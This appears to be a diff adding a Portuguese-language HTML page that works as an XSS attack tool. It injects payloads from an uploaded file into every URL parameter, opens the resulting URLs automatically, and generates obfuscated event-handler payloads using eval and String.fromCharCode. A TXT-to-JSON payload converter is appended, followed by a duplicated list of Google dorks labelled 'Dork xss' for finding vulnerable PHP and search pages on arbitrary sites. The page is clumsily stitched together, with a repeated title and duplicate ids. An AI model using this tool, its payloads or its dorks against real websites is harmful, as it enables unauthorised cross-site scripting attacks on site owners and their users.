@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modificador de URL com Payloads</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            padding: 20px;
+        }
+        h1 {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        input[type="text"], textarea {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            resize: vertical;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .url-list {
+            margin-top: 20px;
+        }
+        .url-list textarea {
+            height: 200px;
+        }
+        .iframe-container {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Modificador de URL com Payloads</h1>
+    <form id="formURLs">
+        <label for="urlsInput">Insira as URLs (uma por linha):</label>
+        <textarea id="urlsInput" placeholder="https://www.exemplo.com/path?param1=value1&param2=value2"></textarea>
+        
+        <label for="payloadFile">Faça upload do arquivo de payloads XSS:</label>
+        <input type="file" id="payloadFile" accept=".txt" required>
+        
+        <button type="button" onclick="processarURLs()">Processar URLs</button>
+        <button type="button" onclick="abrirURLs()">Abrir URLs</button>
+        <button type="button" onclick="salvarLista()">Salvar Lista</button>
+        <button type="button" onclick="abrirProximaURLemIFrame()">Abrir URLs em iFrame</button>
+        <button type="button" onclick="gerarPayloads()">Gerar Payloads Avançados</button>
+    </form>
+
+    <div class="url-list">
+        <h2>Lista de URLs com Payloads</h2>
+        <textarea id="urlsWithPayloads" readonly></textarea>
+    </div>
+   <h2>URL atual do iFrame:</h2>
+        <p id="currentIframeURL">Nenhuma URL carregada.</p>
+    <div class="iframe-container" id="iframeContainer">
+        
+    </div>
+
+    <script>
+        var urlsComPayloads = [];
+        var iframeIndex = 0;
+
+        function processarURLs() {
+            var urlsInput = document.getElementById('urlsInput').value.trim();
+            var payloadFile = document.getElementById('payloadFile').files[0];
+
+            if (!urlsInput) {
+                alert('Por favor, insira pelo menos uma URL.');
+                return;
+            }
+
+            if (!payloadFile) {
+                alert('Por favor, faça upload de um arquivo de payloads.');
+                return;
+            }
+
+            var reader = new FileReader();
+            reader.onload = function(e) {
+                var payloads = e.target.result.trim().split('\n').map(payload => payload.trim());
+
+                var urls = urlsInput.split('\n').map(url => url.trim());
+                urlsComPayloads = [];
+
+                urls.forEach(url => {
+                    payloads.forEach(payload => {
+                        var urlComPayload = adicionarPayloadNaURL(url, payload);
+                        urlsComPayloads.push(urlComPayload);
+                    });
+                });
+
+                exibirListaURLs(urlsComPayloads);
+            };
+
+            reader.readAsText(payloadFile);
+        }
+
+        function adicionarPayloadNaURL(url, payload) {
+            var urlObj = new URL(url);
+            var searchParams = urlObj.searchParams;
+
+            if ([...searchParams].length === 0) {
+                // Se a URL não tem parâmetros, adiciona o payload ao final do caminho
+                urlObj.pathname += payload;
+            } else {
+                // Adiciona o payload em cada parâmetro da URL
+                urlObj.searchParams.forEach((value, key) => {
+                    var valorComPayload = value + payload;
+                    searchParams.set(key, valorComPayload);
+                });
+            }
+
+            return urlObj.toString();
+        }
+
+        function exibirListaURLs(urls) {
+            var urlsWithPayloadsTextArea = document.getElementById('urlsWithPayloads');
+            urlsWithPayloadsTextArea.value = urls.join('\n');
+        }
+
+        function abrirURLs() {
+            abrirURLsUmaPorUma(urlsComPayloads);
+        }
+
+        function abrirURLsUmaPorUma(urls) {
+            var index = 0;
+
+            function abrirProximaURL() {
+                if (index < urls.length) {
+                    var url = urls[index];
+                    window.open(url, '_blank');
+                    index++;
+                    setTimeout(abrirProximaURL, 3000); // Abre a próxima URL após 3 segundos
+                }
+            }
+
+            abrirProximaURL();
+        }
+
+        function abrirProximaURLemIFrame() {
+            if (iframeIndex < urlsComPayloads.length) {
+                var url = urlsComPayloads[iframeIndex];
+                var iframeContainer = document.getElementById('iframeContainer');
+                iframeContainer.innerHTML = ''; // Limpa o conteúdo anterior
+
+                var iframe = document.createElement('iframe');
+                iframe.src = url;
+                iframe.width = '100%';
+                iframe.height = '600px';
+                iframe.onload = function() {
+                    // Pode adicionar aqui funcionalidades específicas ao carregar o iframe, se necessário
+                };
+                iframeContainer.appendChild(iframe);
+
+                var currentIframeURL = document.getElementById('currentIframeURL');
+                currentIframeURL.textContent = url;
+
+                iframeIndex++;
+                
+                // Chama a próxima URL após 3 segundos
+                setTimeout(abrirProximaURLemIFrame, 3000);
+            } else {
+                alert('Todas as URLs foram abertas em iFrames.');
+            }
+        }
+
+        function salvarLista() {
+            var urlsParaSalvar = document.getElementById('urlsWithPayloads').value;
+            var blob = new Blob([urlsParaSalvar], { type: 'text/plain' });
+
+            var link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'urls_com_payloads.txt';
+            link.click();
+        }
+
+        function gerarPayloads() {
+            const maxTags = 10;
+            const maxEvents = 5;
+
+            const tags = [
+                "a", "abbr", "acronym", "address", "applet", "area", "article", "aside", "audio",
+                "b", "base", "basefont", "bdi", "bdo", "big", "blockquote", "body", "br", "button",
+                "canvas", "caption", "center", "cite", "code", "col", "colgroup", "data", "datalist",
+                "dd", "del", "details", "dfn", "dialog", "dir", "div", "dl", "dt", "em", "embed",
+                "fieldset", "figcaption", "figure", "font", "footer", "form", "frame", "frameset",
+                "h1", "h2", "h3", "h4", "h5", "h6", "head", "header", "hr", "html", "i", "iframe",
+                "img", "input", "ins", "kbd", "label", "legend", "li", "link", "main", "map", "mark",
+                "meta", "meter", "nav", "noframes", "noscript", "object", "ol", "optgroup", "option",
+                "output", "p", "param", "picture", "pre", "progress", "q", "rp", "rt", "ruby", "s",
+                "samp", "script", "section", "select", "small", "source", "span", "strike", "strong",
+                "style", "sub", "summary", "sup", "table", "tbody", "td", "template", "textarea",
+                "tfoot", "th", "thead", "time", "title", "tr", "track", "tt", "u", "ul", "var", "video",
+                "wbr"
+            ];
+
+            // Limitando o número máximo de tags e adicionando aleatoriedade
+            const limitedTags = getRandomElements(tags, maxTags);
+
+            const payloads = [];
+            const scriptContent = 'alert("XSS")';
+
+            // Função para escapar HTML
+            function escapeHTML(content) {
+                return content.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
+            }
+
+            // Função para obter elementos aleatórios de um array
+            function getRandomElements(arr, n) {
+                let result = new Array(n),
+                    len = arr.length,
+                    taken = new Array(len);
+                if (n > len)
+                    throw new RangeError("getRandomElements: mais elementos tomados do que disponíveis");
+                while (n--) {
+                    let x = Math.floor(Math.random() * len);
+                    result[n] = arr[x in taken ? taken[x] : x];
+                    taken[x] = --len in taken ? taken[len] : len;
+                }
+                return result;
+            }
+
+            limitedTags.forEach(tag => {
+                const encodedScript = escapeHTML(scriptContent);
+                const payload = `<${tag}>${encodedScript}</${tag}>`;
+                payloads.push(payload);
+            });
+
+            // Generate payloads with onload attribute for tags that support it
+            const tagsWithOnload = ["body", "img", "iframe", "link", "audio", "video"];
+            tagsWithOnload.forEach(tag => {
+                const encodedScript = escapeHTML(scriptContent);
+                const payload = `<${tag} onload="${encodedScript}">`;
+                payloads.push(payload);
+            });
+
+            // Limitando o número máximo de eventos e adicionando aleatoriedade
+            const events = ["onmouseover", "onerror", "onfocus", "onblur", "onmousemove", "onload", "onclick", "ondblclick"];
+            const limitedEvents = getRandomElements(events, maxEvents);
+
+            // Generate payloads with other event handlers
+            limitedTags.forEach(tag => {
+                limitedEvents.forEach(event => {
+                    // Obfuscando o script
+                    const obfuscatedScript = scriptContent.split('').map(char => `\\x${char.charCodeAt(0).toString(16).padStart(2, '0')}`).join('');
+                    const payload = `<${tag} ${event}="eval(String.fromCharCode(${obfuscatedScript}))">`;
+                    payloads.push(payload);
+                });
+            });
+
+            // Save payloads to a file
+            const filename = 'advanced_xss_payloads.txt';
+            const blob = new Blob([payloads.join('\n')], { type: 'text/plain' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = filename;
+            link.click();
+
+            console.log(`Payloads salvos em ${filename}`);
+        }
+    </script>
+<title>Conversor de TXT para JSON com Download</title>
+<style>
+    textarea {
+        width: 100%;
+        height: 150px;
+    }
+</style>
+<script>
+    function convertToJSON() {
+        let txtPayloads = document.getElementById('txtPayloads').value.trim();
+        if (!txtPayloads) {
+            alert("Por favor, insira os payloads no formato TXT.");
+            return;
+        }
+
+        let lines = txtPayloads.split('\n');
+        let payloadArray = lines.map(line => {
+            return { "payload_name": line.trim() };
+        });
+
+        let payloadJSON = {
+            "payload": payloadArray
+        };
+
+        let jsonOutput = JSON.stringify(payloadJSON, null, 2);
+        document.getElementById('jsonOutput').value = jsonOutput;
+
+        // Download do JSON
+        downloadJSON(jsonOutput);
+    }
+
+    function downloadJSON(jsonContent) {
+        let blob = new Blob([jsonContent], { type: 'application/json' });
+        let url = URL.createObjectURL(blob);
+        let a = document.createElement('a');
+        a.href = url;
+        a.download = 'payloads.json';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+    }
+</script>
+
+
+    <h2>Conversor de TXT para JSON com Download</h2>
+    <label for="txtPayloads">Insira os payloads no formato TXT:</label>
+    <br>
+    <textarea id="txtPayloads" placeholder="Insira um payload por linha..."></textarea>
+    <br><br>
+    <button onclick="convertToJSON()">Converter para JSON</button>
+    <br><br>
+    <label for="jsonOutput">Payloads no formato JSON:</label>
+    <br>
+    <textarea id="jsonOutput" readonly></textarea>
+    <h2>Dork xss:</h2>
+    <label for="txtPayloads"></label>
+    <br>
+    <textarea id="txtPayloads" rows="20" cols="80">
+inurl:".php?cmd="
+inurl:".php?z="
+inurl:".php?q="
+inurl:".php?search="
+inurl:".php?query="
+inurl:".php?searchst­ring="
+inurl:".php?keyword=­"
+inurl:".php?file="
+inurl:".php?years="
+inurl:".php?txt="
+inurl:".php?tag="
+inurl:".php?max="
+inurl:".php?from="
+inurl:".php?author="
+inurl:".php?pass="
+inurl:".php?feedback­="
+inurl:".php?mail="
+inurl:".php?cat="
+inurl:".php?vote="
+inurl:search.php?q=
+inurl:com_feedpostol­d/feedpost.php?url=
+inurl:scrapbook.php?­id=
+inurl:headersearch.p­hp?sid=
+inurl:/poll/­default.asp?catid=
+inurl:/­search_results.php?se­arch=
+inurl:categoryId inurl:storeId (2 million results)
+inurl:resultCatEntryType
+inurl:searchTermScope
+inurl:”webapp/wcs”
+inurl:”ProductListingView”
+inurl:”AdvancedSearchDisplay”
+inurl:”CompareProductsDisplayView”
+inurl:parent_category_rn
+inurl:& inurl:test
+inurl:& inurl:quiz
+inurl:& inurl:survey
+inurl:& inurl:game
+inurl:& inurl:competition
+inurl:& inurl:form
+inurl:& inurl:title
+inurl:& inurl:search
+inurl:& inurl:city
+inurl:& inurl:date
+inurl:& inurl:topic
+inurl:& inurl:search inurl:q
+inurl:& inurl:search inurl:s
+index.php? inurl:& 
+inurl:search
+inurl:suche
+inurl:page
+inurl:& inurl:query
+inurl:& inurl:suche
+inurl:& inurl:input
+inurl:& inurl:next
+inurl:& inurl:target
+inurl:search inurl:page
+inurl:search inurl:p
+inurl:query filetype:html inurl:page
+inurl:query filetype:html inurl:sort
+inurl:query filetype:php
+inurl:& inurl:test
+inurl:& inurl:quiz
+inurl:& inurl:survey
+inurl:& inurl:game
+inurl:& inurl:competition
+inurl:& inurl:form
+inurl:& inurl:title
+inurl:& inurl:search
+inurl:& inurl:city
+inurl:& inurl:date
+inurl:& inurl:topic
+inurl:& inurl:search inurl:q
+inurl:& inurl:search inurl:s
+index.php? inurl:& 
+inurl:search
+inurl:suche
+inurl:page
+inurl:& inurl:query
+inurl:& inurl:suche
+inurl:& inurl:input
+inurl:& inurl:next
+inurl:& inurl:target
+inurl:search inurl:page
+inurl:search inurl:p
+inurl:query filetype:html inurl:page
+inurl:query filetype:html inurl:sort
+inurl:query filetype:php
+</textarea>
+<br><br>
+
+
+</html>
+
